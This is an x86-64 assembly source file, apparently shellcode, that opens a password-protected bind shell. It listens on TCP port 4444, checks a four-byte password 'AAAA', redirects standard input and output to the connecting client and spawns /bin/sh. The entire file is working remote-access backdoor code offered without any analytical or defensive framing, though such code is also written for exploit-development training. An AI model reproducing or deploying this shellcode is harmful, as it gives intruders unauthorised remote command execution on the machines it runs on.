BITS 64
global _start
section .text

; Constants
AF_INET equ 2
PASSWORD equ 'AAAA'
PORT equ 0x5c11

SIZE_STRUCT equ 16
SOCK_STREAM equ 1

; syscalls
SYS_ACCEPT equ 43
SYS_BIND equ 49
SYS_DUP2 equ 33
SYS_EXECVE equ 59
SYS_LISTEN equ 50
SYS_SOCKET equ 41


_start:

_init_socket: 
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

    push SYS_SOCKET
    pop rax
    push AF_INET
    pop RDI
    push SOCK_STREAM
    pop rsi

    syscall 
    mov r10, rax ; save created socket in r10

_init_struct_sockaddr:
    ; struct sockaddr = {AF_INET; 4444; 0x0; 0x0}
    
    sub rsp, 16
    mov byte[rsp], AF_INET
    mov word[rsp + 0x2], PORT 
    push rsp
    pop rsi

_bind_sock:
    ;bind(sockfd, const struct sockaddr *addr, 16)

    push rax
    pop rdi
    push SIZE_STRUCT
    pop rdx 
    push SYS_BIND
    pop rax 

    syscall

_listen:
    ;listen(fd, 0)

    push r10
    pop rdi
    xor rsi, rsi ; backlog 0
    push SYS_LISTEN 
    pop rax

    syscall

_accept_client:
    ;accept(fd, struct sockaddr *addr, 16)

    push r10 
    pop rdi
    push SIZE_STRUCT
    pop rdx
    push SYS_ACCEPT
    pop rax
    xor rsi, rsi 

    syscall

    push rax
    pop rdi

_read_pw:
    ;read(client, *buf, 4)
    
    push rsp
    pop rsi
    push 0x10
    pop rdx

    xor rax, rax
    syscall

_check_pw:

    cmp dword [rsp], PASSWORD
    je _good_pw
    jmp _burn

_good_pw:

    push 4
    pop rdi
    push 3
    pop rsi

_do_dup2:
    ; loop to duplicate stdin, stdout and stderr to accepted clientsocket

    dec rsi
    mov al, SYS_DUP2
    syscall
    jne _do_dup2

_spawn_shell:
    ; execve('//bin/sh', NULL, NULL)

    xor rdx, rdx
    mov rdi, '/bin//sh'
    push rdx
    push rdi
    push rsp
    pop rdi

    mov al, SYS_EXECVE
    syscall

_burn:
; Kill connection because of wrong password
